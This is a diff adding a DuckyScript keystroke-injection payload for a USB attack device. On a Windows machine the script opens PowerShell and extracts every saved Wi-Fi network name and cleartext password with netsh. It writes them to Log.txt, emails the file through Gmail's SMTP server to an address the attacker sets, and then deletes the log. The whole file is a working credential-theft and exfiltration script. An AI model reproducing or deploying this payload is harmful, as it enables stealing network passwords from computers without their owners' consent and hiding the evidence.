@@ -1,0 +1,46 @@
+REM ---------------------Minimize all windows
+GUI d
+DELAY 300
+GUI r
+DELAY 300
+STRING PowerShell -NoLogo 
+DELAY 300
+REM -windowstyle Minimized
+ENTER
+DELAY 300
+REM to capture the ssid and password and save it in log.txt file
+STRING $(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > Log.txt
+REM ---------------------to send the mail
+ENTER
+DELAY 300
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL USER', 'GMAIL PASSWORD');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'sending email account'
+ENTER
+STRING $ReportEmail.To.Add('email account to send report')
+ENTER
+STRING $ReportEmail.Subject = 'ALL SSID AND PASS'
+ENTER
+REM STRING $ReportEmail.Body = 'Attached is your duck report.' 
+ENTER
+STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+REM ---------------------delete and end
+STRING del Log.txt & exit
+ENTER
+DELAY 300
+STRING exit
+ENTER
